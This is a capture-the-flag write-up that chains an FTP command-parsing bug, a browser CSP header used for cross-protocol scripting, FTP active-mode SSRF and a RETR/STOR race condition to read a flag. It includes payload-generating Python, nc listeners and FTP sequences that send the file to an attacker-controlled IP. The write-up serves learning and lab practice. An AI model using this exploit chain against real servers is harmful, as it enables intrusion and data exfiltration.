# Outline
- bug 1: FTP server reads commands every time it receives a data chunk (tcp segment) instead of splitting on CRLF, allowing us to send multiple FTP commands without needing CRLFs
- bug 2: chrome's Sec-Required-CSP header lets you send arbitrary-length payloads, so we can send commands to the FTP server via Cross-Protocol Scripting
- bug 3: FTP server allows active mode. under active mode, you can use the PORT and RETR commands to SSRF
- bug 4: race condition when doing RETR -> STOR, allowing us to read SSRF output (making it non-blind)


# Step 1 - Cross-Protocol Scripting
1. Abuse bug 1 & 2 to send commands to FTP server
2. because the server processes commands on every incoming data tcp segment, we can send multiple commands without needing to inject CRLFs. Simply send a large enough request, and it will be processed in multiple chunks due to tcp segmentation. The splitting boundary is every 65536 bytes
3. although we can't send POST requests due to no script execution, we can send a massive request via the Sec-Required-CSP header
4. For example:
```py
framecsp = lambda url, csp: f"<iframe src='{url}' csp='{csp}'></iframe>"
gen_html = lambda csp: framecsp(f"http://127.0.0.1:{FTP_PORT}/?csp", csp) 
pad = lambda x: x + " "*(65536 - len(x))
payload1_csp = "a" + " "*65536 + \
pad(f"STAT") + \
pad(f"QUIT") + "X"
gen_html(payload1_csp)
```

# Step 2 - Use STOR to upload a file containing a HTTP req
1. We want to use bug 3 to SSRF, but can't directly hit the /ssrf endpoint because we need to construct a valid HTTP req, so we first upload a file containing one. The file needs to be relatively large (~100kb?) so that we can trigger the race condition
2. nc -l $YOUR_LISTENING_PORT
3. FTP Payload:
    1. N/A -- this contains the http req headers, invalid cmd
    2. USER your_username
    3. PASS your_password
    4. EPRT |1|$YOUR_IP|$YOUR_LISTENING_PORT
    5. STOR http_req.txt
4. send a file containing a large http req to /ssrf, e.g.
```http
GET /ssrf HTTP/1.0
Sec-Pro-Hacker: 1

# [100k bytes of garbage here]
```

# Step 3 - SSRF and use race condition to save a file containing the HTTP output
1. Utilize bugs 3 & 4 to hit /ssrf and read flag
2. The FTP server does not close the socket until the input file (`http_req.txt`) is finished being read. Therefore, if it is very large, you can execute the STOR command to read the output before it is closed.
3. FTP Payload:
    1. N/A -- this contains the HTTP req headers, invalid command
    2. USER username
    3. PASS password
    4. EPRT |1|127.0.0.1|1337
    5. RETR http_req.txt
    6. STOR flag.txt

# Step 4 - Use RETR to read file flag.txt
1. Same idea as step 2, but now we just want to exfil flag.txt
2. nc -l $YOUR_LISTENING_PORT
3. FTP Payload:
    1. N/A -- this contains the http req headers, invalid cmd
    2. USER your_username
    3. PASS your_password
    4. EPRT |1|$YOUR_IP|$YOUR_LISTENING_PORT
    5. RETR flag.txt
